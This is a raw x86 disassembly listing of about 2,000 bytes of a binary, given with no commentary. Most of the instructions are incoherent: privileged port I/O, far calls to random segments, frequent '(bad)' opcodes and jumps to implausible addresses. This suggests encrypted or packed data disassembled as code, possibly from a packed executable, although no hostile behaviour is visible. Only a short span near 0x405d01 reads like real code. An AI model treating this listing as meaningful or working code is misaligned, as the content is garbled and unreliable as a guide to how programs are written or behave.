  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	imul   ebp,DWORD PTR [eax+eiz*4+0x7e326a37],0x7e
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x405a04
  4059bd:	bt     DWORD PTR [eax-0x1],ebx
  4059c1:	jb     0x40595f
  4059c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059c4:	mul    BYTE PTR [edi]
  4059c6:	xor    DWORD PTR [ecx-0x47210625],esi
  4059cc:	pop    esp
  4059cd:	push   cs
  4059ce:	sub    dh,dl
  4059d0:	add    DWORD PTR [esi+eiz*8],ebx
  4059d3:	aam    0x35
  4059d5:	scas   al,BYTE PTR es:[edi]
  4059d6:	test   eax,0xbee2a3ba
  4059db:	loopne 0x4059bc
  4059dd:	mov    ah,0x80
  4059df:	and    BYTE PTR [ebx],bl
  4059e1:	jg     0x405a1d
  4059e3:	daa    
  4059e4:	dec    edi
  4059e5:	fdiv   QWORD PTR [esi+0x30]
  4059e8:	mov    cl,0xda
  4059ea:	in     al,dx
  4059eb:	out    dx,al
  4059ec:	push   0x23a074a7
  4059f1:	sub    eax,0xf51a62a8
  4059f6:	sti    
  4059f7:	test   eax,0x61455f1
  4059fc:	inc    edi
  4059fd:	fld    TBYTE PTR [esi+0x1f5ce5f1]
  405a03:	cmp    DWORD PTR [esi+0x5a],0xffffff80
  405a07:	mov    ecx,0x4c02cb57
  405a0c:	sbb    al,0xca
  405a0e:	int    0x72
  405a10:	outs   dx,BYTE PTR ds:[esi]
  405a11:	cmp    al,0xc7
  405a13:	int3   
  405a14:	jmp    0x405a6d
  405a16:	inc    esi
  405a17:	adc    esi,DWORD PTR [ebp+0x62]
  405a1a:	mov    ch,0x4b
  405a1c:	and    eax,0x7b0ce084
  405a21:	pusha  
  405a22:	pop    es
  405a23:	inc    esp
  405a24:	jae    0x4059c7
  405a26:	imul   ebx,DWORD PTR [edi+eiz*8+0x5],0x4bfd1394
  405a2e:	add    BYTE PTR [edi+0x4c],0xc5
  405a32:	scas   eax,DWORD PTR es:[edi]
  405a33:	enter  0xfcda,0x99
  405a37:	mov    dh,0xee
  405a39:	inc    ebp
  405a3a:	cli    
  405a3b:	aad    0x17
  405a3d:	mov    esi,0x62261ce
  405a42:	call   0xa5c6:0xff65e62d
  405a49:	hlt    
  405a4a:	inc    ecx
  405a4b:	or     dh,BYTE PTR [esi+0x13b4792f]
  405a51:	jp     0x405a39
  405a53:	retf   
  405a54:	cmc    
  405a55:	cmp    dh,BYTE PTR [ebp+0x36e2cc21]
  405a5b:	fadd   st(2),st
  405a5d:	xchg   BYTE PTR [esi+0x1f49198d],al
  405a63:	push   es
  405a64:	inc    ebx
  405a65:	xor    ebp,esi
  405a67:	sbb    al,0x68
  405a69:	daa    
  405a6a:	add    al,0xa4
  405a6c:	stc    
  405a6d:	dec    ecx
  405a6e:	mov    WORD PTR [ecx-0xf],?
  405a71:	xchg   dl,al
  405a73:	fwait
  405a74:	adc    al,0x3f
  405a76:	dec    esp
  405a77:	popf   
  405a78:	xchg   edi,eax
  405a79:	pop    eax
  405a7a:	call   0xd7b6:0xaf71b79
  405a81:	fnstenv [edi+ecx*4+0x6e]
  405a85:	iret   
  405a86:	inc    ebx
  405a87:	inc    ebx
  405a88:	jae    0x405ac0
  405a8a:	rol    DWORD PTR [ebx+0x68052233],0xbb
  405a91:	push   ds
  405a92:	xlat   BYTE PTR ds:[ebx]
  405a93:	inc    esp
  405a94:	adc    al,0x64
  405a96:	pop    esp
  405a97:	(bad)  
  405a99:	js     0x405af1
  405a9b:	(bad)
  405aa0:	push   edx
  405aa1:	jno    0x405ad5
  405aa3:	xchg   edi,eax
  405aa4:	jb     0x405a91
  405aa6:	push   eax
  405aa7:	push   0x72
  405aa9:	jb     0x405a61
  405aab:	lods   al,BYTE PTR ds:[esi]
  405aac:	(bad)
  405ab0:	add    BYTE PTR [ecx+0x370c7a72],bl
  405ab6:	jne    0x405abb
  405ab8:	push   0x8eb48c1d
  405abd:	inc    esi
  405abe:	dec    edx
  405abf:	push   ss
  405ac0:	push   0xffffff8e
  405ac2:	adc    al,0xd7
  405ac4:	cmp    DWORD PTR [eax-0x7d],ebp
  405ac7:	push   0x7091c68
  405acc:	cmp    ch,BYTE PTR [esi+0x2f8f2d22]
  405ad2:	cmp    al,0x45
  405ad4:	ret    
  405ad5:	push   edx
  405ad6:	add    al,0x8f
  405ad8:	test   DWORD PTR [ebx+0x2cc48346],esp
  405ade:	and    ch,bl
  405ae0:	pop    ss
  405ae1:	sar    DWORD PTR ds:0xfa1ec319,cl
  405ae7:	mov    al,ds:0xa63d9fcb
  405aec:	push   edx
  405aed:	fcmovu st,st(2)
  405aef:	in     eax,0xf7
  405af1:	aam    0xd4
  405af3:	inc    di
  405af5:	lods   eax,DWORD PTR ds:[esi]
  405af6:	test   DWORD PTR [esi-0x75],ecx
  405af9:	push   es
  405afa:	nop
  405afb:	mov    al,ds:0xf8439966
  405b00:	in     al,dx
  405b01:	dec    ecx
  405b02:	es js  0x405b5e
  405b05:	dec    edx
  405b06:	das    
  405b07:	inc    ecx
  405b08:	sub    dl,dh
  405b0a:	push   ss
  405b0b:	push   es
  405b0c:	xchg   esp,eax
  405b0d:	retf   
  405b0e:	ffree  st(7)
  405b10:	daa    
  405b11:	fwait
  405b12:	push   0xe70e9c0e
  405b17:	jns    0x405b94
  405b19:	pop    es
  405b1a:	pop    edx
  405b1b:	xchg   edi,eax
  405b1c:	outs   dx,DWORD PTR ds:[esi]
  405b1d:	cs sbb al,0x12
  405b20:	mov    eax,ds:0x5051c725
  405b25:	ss (bad) 
  405b28:	aad    0x4d
  405b2a:	mov    al,BYTE PTR [ebp+esi*1+0x51]
  405b2e:	and    ebx,eax
  405b30:	dec    edx
  405b31:	add    DWORD PTR [edx],ebp
  405b33:	jne    0x405b5f
  405b35:	(bad)  
  405b36:	retf   0x8497
  405b39:	sahf   
  405b3a:	repnz call 0x789c:0xd00902c6
  405b42:	or     eax,0x550386e1
  405b47:	jo     0x405b0d
  405b49:	mov    bl,0xf7
  405b4b:	xchg   BYTE PTR [esi+edx*1+0x42],bl
  405b4f:	jno    0x405b01
  405b51:	sbb    DWORD PTR [ebp+0x7202181f],esp
  405b57:	inc    esp
  405b58:	sub    BYTE PTR [ebx],bh
  405b5a:	fld    TBYTE PTR [eax+0x57]
  405b5d:	add    BYTE PTR [edi-0x33],dl
  405b60:	sbb    DWORD PTR [eax+0x2ac3dbf7],esp
  405b66:	call   0x7693f608
  405b6b:	hlt    
  405b6c:	push   eax
  405b6d:	sbb    esi,eax
  405b6f:	fsub   DWORD PTR [esi]
  405b71:	xor    edx,DWORD PTR [edi+0x7e9c5770]
  405b77:	mov    ch,0x5b
  405b79:	mov    ebp,0x7cee0795
  405b7e:	cmp    al,0x17
  405b80:	ins    DWORD PTR es:[edi],dx
  405b81:	(bad)  
  405b82:	(bad)  
  405b84:	fwait
  405b85:	pop    es
  405b86:	call   0x44fd:0xcce4911d
  405b8d:	mov    eax,ds:0xd696cec0
  405b92:	xor    dh,BYTE PTR [eax]
  405b94:	sti    
  405b95:	mov    ah,0x49
  405b97:	mov    bl,0x7a
  405b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b9a:	into   
  405b9b:	mov    eax,ds:0xab577156
  405ba0:	in     al,dx
  405ba1:	sbb    eax,0x5e11f8d8
  405ba6:	xor    al,0x52
  405ba8:	call   0xa735:0x4c0e6de6
  405baf:	xor    eax,0x2c7e9e75
  405bb4:	sar    DWORD PTR [eax],1
  405bb6:	shl    DWORD PTR [ebx],1
  405bb8:	ret    
  405bb9:	dec    ebp
  405bba:	pop    ecx
  405bbb:	ins    BYTE PTR es:[edi],dx
  405bbc:	popa   
  405bbd:	cs loope 0x405c29
  405bc0:	lmsw   ax
  405bc3:	(bad)  
  405bc4:	xlat   BYTE PTR ds:[ebx]
  405bc5:	mov    ecx,0x3e58a421
  405bca:	xor    eax,0x918630c1
  405bcf:	or     cl,BYTE PTR [eax]
  405bd1:	dec    esi
  405bd2:	jmp    0x405bed
  405bd4:	scas   eax,DWORD PTR es:[edi]
  405bd5:	cli    
  405bd6:	xchg   BYTE PTR [eax-0x51dd1f71],dl
  405bdc:	xchg   edx,eax
  405bdd:	xchg   edx,eax
  405bde:	test   al,0x67
  405be0:	pop    edx
  405be1:	ja     0x405b78
  405be3:	xchg   edx,eax
  405be4:	dec    eax
  405be5:	cld    
  405be6:	inc    edx
  405be7:	lock leave 
  405be9:	add    BYTE PTR [esi+0x354de26e],dh
  405bef:	pop    DWORD PTR [ebp+0x7f77c2ce]
  405bf5:	xor    eax,0x9f8f0a33
  405bfa:	(bad)  
  405bfb:	sub    DWORD PTR [edx],ebx
  405bfd:	mov    ebp,0xd063b8d
  405c02:	rol    DWORD PTR [edi],0x91
  405c05:	mov    eax,0x104b58e4
  405c0a:	push   0x5c0b13a5
  405c0f:	leave  
  405c10:	imul   ebx,DWORD PTR [ebp-0x4fcbc1f7],0xffffff9e
  405c17:	or     al,0x80
  405c19:	shl    DWORD PTR cs:[edx+0x46202a7c],cl
  405c20:	sub    esp,ebx
  405c22:	mov    BYTE PTR [eax-0x20],0x80
  405c26:	adc    esi,DWORD PTR [ecx]
  405c28:	aad    0x21
  405c2a:	jae    0x3c7337d8
  405c30:	or     eax,0xa11ba8c0
  405c35:	dec    ebp
  405c36:	lock or eax,0x597d8915
  405c3c:	jnp    0x405c55
  405c3e:	mov    BYTE PTR [ecx-0x1550dbb3],dl
  405c44:	rol    DWORD PTR [edx],0x5
  405c47:	pop    esp
  405c48:	out    0xda,al
  405c4a:	mov    esp,edx
  405c4c:	mov    ebp,0x81d9a008
  405c51:	and    BYTE PTR [eax],bl
  405c53:	jae    0x405c30
  405c55:	in     eax,0x74
  405c57:	cli    
  405c58:	comiss xmm6,DWORD PTR [ebx+0x3e9f10c4]
  405c5f:	repnz adc dl,BYTE PTR [edi-0xf]
  405c63:	and    BYTE PTR [eax+edx*2+0x60ebb824],dh
  405c6a:	push   cs
  405c6b:	hlt    
  405c6c:	psllq  mm3,QWORD PTR [edi]
  405c6f:	or     al,BYTE PTR [edx-0x7b355e6f]
  405c75:	retf   
  405c76:	xchg   edi,eax
  405c77:	int    0x6e
  405c79:	imul   ebp,DWORD PTR [ebp-0x2a],0x1cfb0119
  405c80:	and    BYTE PTR [edx+0x78],ah
  405c83:	jl     0x405caa
  405c85:	xchg   bh,bl
  405c87:	loop   0x405c15
  405c89:	imul   esp,esp,0x871757a1
  405c8f:	lock gs aas 
  405c92:	xor    BYTE PTR [esi-0x5f925b18],ah
  405c98:	(bad)
  405c9b:	aam    0xcb
  405c9d:	push   es
  405c9e:	mov    cl,0xb9
  405ca0:	retf   
  405ca1:	das    
  405ca2:	int3   
  405ca3:	(bad)  
  405ca4:	adc    esi,eax
  405ca6:	and    edi,esi
  405ca8:	mov    ds:0xa6db2042,eax
  405cad:	aas    
  405cae:	loopne 0x405cd0
  405cb0:	stos   DWORD PTR es:[edi],eax
  405cb1:	aad    0x70
  405cb3:	leave  
  405cb4:	cli    
  405cb5:	push   esi
  405cb6:	xchg   ecx,eax
  405cb7:	pop    ecx
  405cb8:	pushf  
  405cb9:	and    eax,0x7e22ab4b
  405cbe:	adc    DWORD PTR [esi-0x5e88beff],edx
  405cc4:	dec    edi
  405cc5:	rcl    BYTE PTR [esp+edx*2+0x767ef103],1
  405ccc:	lea    eax,[eax+0x52]
  405ccf:	shl    BYTE PTR [esi],cl
  405cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cd3:	sahf   
  405cd4:	jmp    DWORD PTR [ebx+ecx*2+0x4d]
  405cd8:	xor    al,0x3a
  405cda:	dec    edx
  405cdb:	imul   ebx,DWORD PTR [ebx+esi*4],0xfffffff5
  405cdf:	jno    0x405cb9
  405ce1:	aas    
  405ce2:	bound  edx,QWORD PTR [ebx-0x3872c450]
  405ce8:	cmp    al,0x5f
  405cea:	out    dx,al
  405ceb:	xchg   ebx,eax
  405cec:	sbb    esi,DWORD PTR [ebx-0x77]
  405cef:	aam    0x2a
  405cf1:	and    edx,DWORD PTR [ebp-0x2cb24e45]
  405cf7:	cs cmc 
  405cf9:	mov    edx,DWORD PTR [ebp-0x34]
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	in     al,0x25
  405d2d:	sub    DWORD PTR [eax+0x7e7e3e2f],ecx
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d87
  405d38:	jecxz  0x405d6a
  405d3a:	dec    esp
  405d3b:	test   eax,0xcc368cc1
  405d40:	leave  
  405d41:	dec    edi
  405d42:	cmp    eax,0x387d4f6f
  405d47:	mov    cl,0x88
  405d49:	xor    eax,0x8cb3a1d1
  405d4e:	add    dl,0x84
  405d51:	mov    bh,0x8b
  405d53:	fcomp  st(6)
  405d55:	rcr    BYTE PTR [ebp-0x4a],cl
  405d58:	mov    ch,0x8f
  405d5a:	in     al,0x35
  405d5c:	jl     0x405d13
  405d5e:	enter  0x7df2,0x2a
  405d62:	sub    bl,dh
  405d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d65:	repz mov ebp,0xeee5983e
  405d6b:	xor    al,0xe1
  405d6d:	rcr    BYTE PTR [esi+0x69f3a3b],0xb9
  405d74:	fnstcw WORD PTR [eax]
  405d76:	(bad)  
  405d77:	cli    
  405d78:	pop    ebp
  405d79:	push   edx
  405d7a:	mov    ah,0xa
  405d7c:	push   ebx
  405d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d7f:	sbb    eax,DWORD PTR [esi]
  405d81:	push   eax
  405d82:	out    0x8f,eax
  405d84:	inc    esp
  405d85:	stos   BYTE PTR es:[edi],al
  405d86:	inc    esi
  405d87:	stc    
  405d88:	xchg   ebx,eax
  405d89:	inc    edx
  405d8a:	inc    eax
  405d8b:	cli    
  405d8c:	add    edx,edx
  405d8e:	push   edi
  405d8f:	adc    DWORD PTR [ecx+edi*8],eax
  405d92:	test   BYTE PTR [edi],bh
  405d94:	xchg   esi,eax
  405d95:	mov    esi,0xc1ba4d14
  405d9a:	retfw  0x590
  405d9e:	adc    eax,DWORD PTR [edx+0x2000ae60]
  405da4:	dec    ebp
  405da5:	out    dx,al
  405da6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405da7:	gs mov esi,0xc4a22e11
  405dad:	mov    ebx,0x5067d99c
  405db2:	outs   dx,DWORD PTR ds:[esi]
  405db3:	gs in  eax,dx
  405db5:	std    
  405db6:	scas   eax,DWORD PTR es:[edi]
  405db7:	div    DWORD PTR [ebx-0x655e3353]
  405dbd:	fdivp  st(2),st
  405dbf:	xor    eax,0x15efc77e
  405dc4:	xor    al,0x7c
  405dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dc7:	repz and BYTE PTR [edx+0x52],dl
  405dcb:	jmp    0x2b2b6068
  405dd0:	cdq    
  405dd1:	ds clc 
  405dd3:	cmp    bh,ah
  405dd5:	push   ss
  405dd6:	mov    ecx,0x5c494419
  405ddb:	xor    DWORD PTR [edi-0x52],edi
  405dde:	cmp    al,0xb0
  405de0:	pop    edi
  405de1:	adc    DWORD PTR [esi+0x34],eax
  405de4:	and    DWORD PTR [ebp+0x20be4041],ebx
  405dea:	pushf  
  405deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dec:	mov    dh,BYTE PTR [esi]
  405dee:	popf   
  405def:	xchg   esi,eax
  405df0:	add    al,0x50
  405df2:	add    al,dl
  405df4:	pop    ds
  405df5:	fsubr  st(7),st
  405df7:	jecxz  0x405dd0
  405df9:	and    edx,DWORD PTR [esi-0x6]
  405dfc:	and    BYTE PTR [eax],bh
  405dfe:	jne    0x405e21
  405e00:	icebp  
  405e01:	test   ecx,edx
  405e03:	les    eax,FWORD PTR [ebx-0x5b]
  405e06:	add    DWORD PTR [ebx],0xffffffe2
  405e09:	jae    0x405d90
  405e0b:	lods   eax,DWORD PTR ds:[esi]
  405e0c:	sub    edi,0x32
  405e0f:	xor    DWORD PTR [edi-0x4cdf69d],edi
  405e15:	push   esi
  405e16:	inc    esi
  405e17:	(bad)  [ebx+edi*8-0x7a8bcd03]
  405e1e:	ins    DWORD PTR es:[edi],dx
  405e1f:	dec    ebx
  405e20:	fild   WORD PTR [edx+0x2b34b4de]
  405e26:	mov    ecx,0x8656ee73
  405e2b:	out    dx,eax
  405e2c:	rcl    DWORD PTR [ebx+0x3efd4ab],0xef
  405e33:	mov    eax,ds:0xcc9c854b
  405e38:	xchg   esp,eax
  405e39:	xchg   BYTE PTR [eax+0x7f],cl
  405e3c:	hlt    
  405e3d:	loop   0x405e17
  405e3f:	mov    ch,0x54
  405e41:	cmp    eax,DWORD PTR [ecx+0x1578da21]
  405e47:	lods   al,BYTE PTR ds:[esi]
  405e49:	popf   
  405e4a:	dec    esp
  405e4b:	cmc    
  405e4c:	sub    DWORD PTR [eax],eax
  405e4e:	pop    edi
  405e4f:	cmc    
  405e50:	push   ds
  405e51:	xchg   edx,eax
  405e52:	in     al,0x39
  405e54:	add    DWORD PTR [esi+0x43],edx
  405e57:	std    
  405e58:	jecxz  0x405e71
  405e5a:	imul   ebx,esp,0x1ed26ad4
  405e60:	aas    
  405e61:	xchg   ebx,eax
  405e62:	ret    0xdee3
  405e65:	hlt    
  405e66:	dec    edx
  405e67:	outs   dx,DWORD PTR ds:[esi]
  405e68:	push   ecx
  405e69:	imul   ebp,DWORD PTR [ebp-0x58],0xf11b9f2c
  405e70:	iret   
  405e71:	enter  0x717f,0x4d
  405e75:	xor    ebp,DWORD PTR [eax]
  405e77:	ja     0x405e9d
  405e79:	(bad)  
  405e7a:	cmc    
  405e7b:	stos   DWORD PTR es:[edi],eax
  405e7c:	mov    eax,DWORD PTR [ebx+eax*8]
  405e7f:	loopne 0x405e3c
  405e81:	mov    esp,0x62a22a34
  405e86:	inc    ebx
  405e87:	mov    ecx,0x6175ada2
  405e8c:	xchg   ebp,eax
  405e8d:	in     al,dx
  405e8e:	(bad)  
  405e8f:	aas    
  405e90:	push   0xffffff81
  405e92:	cwde   
  405e93:	pop    es
  405e94:	popf   
  405e95:	mov    ds:0x533e97a7,eax
  405e9a:	add    ecx,DWORD PTR [ebx-0x25fe3c5d]
  405ea0:	mov    ds:0x77c6d727,eax
  405ea5:	iret   
  405ea6:	imul   edx,DWORD PTR [eax-0x36],0xffffffd2
  405eaa:	dec    ebp
  405eab:	and    eax,DWORD PTR [ebx+edx*4-0x27aeea46]
  405eb2:	jne    0x405e67
  405eb4:	lods   al,BYTE PTR ds:[esi]
  405eb5:	es in  eax,dx
  405eb7:	(bad)  
  405eb9:	imul   edx,DWORD PTR [esi+esi*4+0x3870f8c7],0xffffffb2
  405ec1:	lds    ebp,FWORD PTR [esi]
  405ec3:	cdq    
  405ec4:	test   eax,0x76281f25
  405ec9:	fs mov edi,0x39055c33
  405ecf:	inc    esi
  405ed0:	inc    edx
  405ed1:	data16 mul BYTE PTR ds:0x27fe85c3
  405ed8:	mov    al,0xd
  405eda:	mov    edx,0x72561832
  405edf:	and    dl,bh
  405ee1:	dec    ebp
  405ee2:	jmp    FWORD PTR [edi+0xa]
  405ee5:	call   0xa0e9f78e
  405eea:	dec    esi
  405eeb:	adc    BYTE PTR [edx+eiz*2],ah
  405eee:	mov    cl,0x2b
  405ef0:	sub    edi,DWORD PTR [eax]
  405ef2:	rcr    BYTE PTR [ebp-0x59b25e73],1
  405ef8:	out    0x4,eax
  405efa:	rol    DWORD PTR [ecx+0x685a4f9c],cl
  405f00:	and    ecx,DWORD PTR [esi]
  405f02:	inc    eax
  405f03:	iret   
  405f04:	sbb    eax,0xefa1c859
  405f09:	cmp    ebp,0x42f44849
  405f0f:	jg     0x405eba
  405f11:	repz jbe 0x405ec8
  405f14:	fldcw  WORD PTR [esi+0xb]
  405f17:	sbb    edi,DWORD PTR [esi]
  405f19:	xor    esp,DWORD PTR [ecx]
  405f1b:	es push 0xde43285
  405f21:	call   0x3abf:0x811e65f
  405f28:	mov    ebx,0x3951133d
  405f2d:	pushf  
  405f2e:	push   eax
  405f2f:	sbb    bl,0xd7
  405f32:	mov    ebx,0x3b0fa399
  405f37:	mov    dl,0x8f
  405f39:	mov    edx,0x2841aa22
  405f3e:	sbb    BYTE PTR [edx+0x7801447c],dh
  405f44:	mov    dl,0x3
  405f46:	stos   DWORD PTR es:[edi],eax
  405f47:	xchg   ebx,eax
  405f48:	mov    ebx,0xf8a7b0ab
  405f4d:	mov    eax,ds:0xe7f14364
  405f52:	push   edx
  405f53:	arpl   WORD PTR [esp+eax*4-0x44],bp
  405f57:	daa    
  405f58:	pop    esi
  405f59:	mov    al,ds:0xf55cea81
  405f5e:	inc    ebp
  405f5f:	mov    ah,0x84
  405f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f62:	fwait
  405f63:	cmp    BYTE PTR [edx-0x3e06434a],cl
  405f69:	rep ins BYTE PTR es:[edi],dx
  405f6b:	mov    edi,0x9d690bd4
  405f70:	imul   BYTE PTR [ebp-0x4a]
  405f73:	fsub   st,st(2)
  405f75:	(bad)  
  405f76:	jp     0x405fe5
  405f78:	sub    BYTE PTR [ebx+0x647ebacd],ah
  405f7e:	and    DWORD PTR [ebp+0x3a92615a],ebx
  405f84:	push   ss
  405f85:	ret    
  405f86:	outs   dx,DWORD PTR ds:[esi]
  405f87:	pop    ebp
  405f88:	xor    BYTE PTR [esi+0x72],bl
  405f8b:	stos   BYTE PTR es:[edi],al
  405f8c:	pushf  
  405f8d:	add    DWORD PTR [ebp-0xfbe0ebb],0xd192e7b0
  405f97:	sub    al,0x6b
  405f99:	add    BYTE PTR [ebp-0x29b4c6e8],0x23
  405fa0:	stos   BYTE PTR es:[edi],al
  405fa1:	push   esi
  405fa2:	jo     0x405fa4
  405fa4:	ret    0x964a
  405fa7:	dec    ebp
  405fa8:	adc    edi,DWORD PTR [esp+esi*4-0x5]
  405fac:	cmp    BYTE PTR [eax],dh
  405fae:	mov    DWORD PTR [edi],edi
  405fb0:	xchg   ebx,eax
  405fb1:	mov    ebp,0x235f2212
  405fb6:	fwait
  405fb7:	push   es
  405fb8:	popfw  
  405fba:	inc    ecx
  405fbb:	outs   dx,BYTE PTR ds:[esi]
  405fbc:	push   esp
  405fbd:	jbe    0x405feb
  405fbf:	mov    eax,esp
  405fc1:	xchg   esp,eax
  405fc2:	test   eax,0x1c9c6ad3
  405fc7:	push   eax
  405fc8:	aad    0xfc
  405fca:	enter  0xa453,0xe9
  405fce:	push   ebp
  405fcf:	push   0xffffffce
  405fd1:	cmp    eax,0x985b76e2
  405fd6:	daa    
  405fd7:	jno    0x406019
  405fd9:	mov    ebx,0xe86070ac
  405fde:	iret   
  405fdf:	int3   
  405fe0:	inc    ebx
  405fe1:	push   cs
  405fe2:	out    0xff,eax
  405fe4:	or     edx,DWORD PTR [edx+edx*4]
  405fe7:	and    edi,DWORD PTR [ecx+ebp*2+0x4]
  405feb:	xor    DWORD PTR [ecx],edi
  405fed:	aas    
  405fee:	stc    
  405fef:	ret    0xd4d2
  405ff2:	scas   eax,DWORD PTR es:[edi]
  405ff3:	es icebp 
  405ff5:	xchg   DWORD PTR ds:0x45aab70,eax
  405ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ffc:	sbb    al,0xa3
  405ffe:	inc    ecx
  405fff:	das    
  406000:	xor    al,0x38
  406002:	jl     0x405fc7
  406004:	and    eax,0x104a6d47
  406009:	mov    ds:0xbb677a3b,al
  40600e:	loop   0x406083
  406010:	pushf  
  406011:	or     eax,0x613f2ce2
  406016:	pop    edi
  406017:	or     dl,BYTE PTR [edx]
  406019:	sbb    ebx,eax
  40601b:	mov    edx,0x35387da6
  406020:	repnz vaesdeclast xmm6{k2},xmm5,XMMWORD PTR [ebx+0x1b0]
  406028:	scas   eax,DWORD PTR es:[edi]
  406029:	push   DWORD PTR [ecx+edi*1+0x24274ebe]
  406030:	mov    BYTE PTR ds:0x6a71db73,cl
  406036:	mov    esp,0xfde613c4
  40603b:	inc    esp
  40603c:	mov    ?,WORD PTR [ebp+0x437cba4c]
  406042:	dec    edi
  406043:	sub    eax,0x3a5959bc
  406048:	or     edx,ebx
  40604a:	ja     0x40603f
  40604c:	jns    0x405fe8
  40604e:	nop
  40604f:	ins    DWORD PTR es:[edi],dx
  406050:	dec    edx
  406051:	jb     0x40605c
  406053:	in     al,0x90
  406055:	push   es
  406056:	or     al,0xb8
  406058:	lods   al,BYTE PTR ds:[esi]
  406059:	icebp  
  40605a:	dec    eax
  40605b:	and    DWORD PTR [eax],esp
  40605d:	data16 sahf 
  40605f:	mov    bx,0xd967
  406063:	adc    edx,ebx
  406065:	shr    BYTE PTR [ebp-0x3f],1
  406068:	jmp    0x654d7db6
  40606d:	xor    BYTE PTR ds:0x2cd4fc20,cl
  406073:	fidivr DWORD PTR [ebx]
  406075:	fimul  DWORD PTR [ebx+0x55e9c855]
  40607b:	add    eax,DWORD PTR [eax]
  40607d:	add    BYTE PTR [ecx+0x68f06eef],ch
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0xca
  40608b:	jno    0x406083
  40608d:	popa   
  40608e:	loopne 0x4060cd
  406090:	jle    0x406110
  406092:	xor    edi,DWORD PTR [ebp+0x7e]
  406095:	jle    0x406058
  406097:	xchg   ebp,eax
  406098:	bound  edi,QWORD PTR [esi]
  40609a:	test   eax,0xca6e4023
  40609f:	aas    
  4060a0:	and    ebx,edi
  4060a2:	and    al,0x5d
  4060a4:	dec    ecx
  4060a5:	dec    esi
  4060a6:	inc    eax
  4060a7:	ins    DWORD PTR es:[edi],dx
  4060a8:	jle    0x4060e5
  4060aa:	cmp    DWORD PTR ds:0xa14cd191,0x39
  4060b1:	(bad)  
  4060b2:	cdq    
  4060b3:	or     ch,al
  4060b5:	div    DWORD PTR [ecx+0x15071c18]
  4060bb:	outs   dx,BYTE PTR ds:[esi]
  4060bc:	xchg   BYTE PTR [eax-0x7c],cl
  4060bf:	daa    
  4060c0:	ret    0xdc16
  4060c3:	scas   eax,DWORD PTR es:[edi]
  4060c4:	sub    ebp,ecx
  4060c6:	jo     0x4060d0
  4060c8:	mov    bl,BYTE PTR [ecx]
  4060ca:	inc    eax
  4060cb:	inc    esi
  4060cc:	in     al,dx
  4060cd:	mov    dh,0x46
  4060cf:	test   DWORD PTR [ebx],ecx
  4060d1:	mov    edi,0x979ada03
  4060d6:	dec    edi
  4060d7:	clc    
  4060d8:	xchg   DWORD PTR [edx+ebx*4],esp
  4060db:	imul   edi,DWORD PTR [ebx-0x3c],0x48
  4060df:	inc    eax
  4060e0:	pop    es
  4060e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060e2:	jecxz  0x406115
  4060e4:	mov    edi,0xffd581d8
  4060e9:	add    edi,DWORD PTR [eax-0x7e]
  4060ec:	xchg   ecx,eax
  4060ed:	jp     0x4060c5
  4060ef:	inc    ebp
  4060f0:	pop    edx
  4060f1:	and    bl,BYTE PTR [eax+0x7d]
  4060f4:	cdq    
  4060f5:	xor    eax,DWORD PTR [ecx+esi*4]
  4060f8:	jge    0x4060cf
  4060fa:	xchg   ecx,eax
  4060fb:	in     al,dx
  4060fc:	mov    ecx,0x1c435e00
  406101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406102:	stos   BYTE PTR es:[edi],al
  406103:	push   0x15
  406105:	sub    dh,BYTE PTR [edx]
  406107:	mov    ah,dl
  406109:	mov    ebx,0x7c5ad4c6
  40610e:	jle    0x40612c
  406110:	cmc    
  406111:	jmp    0xb1df8def
  406116:	mov    ds:0xd1d042d,al
  40611b:	mov    ds:0x4968f9e6,eax
  406120:	les    eax,FWORD PTR [esi-0x6c27e93d]
  406126:	jbe    0x406122
  406128:	add    bh,BYTE PTR fs:0x1fe600a7
  40612f:	inc    edi
  406130:	cmc    
  406131:	pushf  
  406132:	(bad)  
  406133:	fucom  st(2)
  406135:	scas   al,BYTE PTR es:[edi]
  406136:	adc    eax,0x2080f333
  40613b:	xor    eax,0x9b78969c
  406140:	lods   al,BYTE PTR ds:[esi]
  406141:	data16 sti 
  406143:	in     eax,0x9c
  406145:	dec    ecx
  406146:	daa    
  406147:	mov    edi,0xa729207
  40614c:	xchg   DWORD PTR [eax+0x63],ebx
  40614f:	cmp    dh,ah
  406151:	pop    ebx
  406152:	(bad)  
  406153:	xchg   ebp,eax
  406154:	sbb    DWORD PTR [edi+0x7f],ebx
  406157:	stos   BYTE PTR es:[edi],al
  406158:	jmp    0x4ac:0x2b9beda
  40615f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406160:	je     0x4060fd
  406162:	push   ds
  406163:	(bad)  
  406164:	clc    
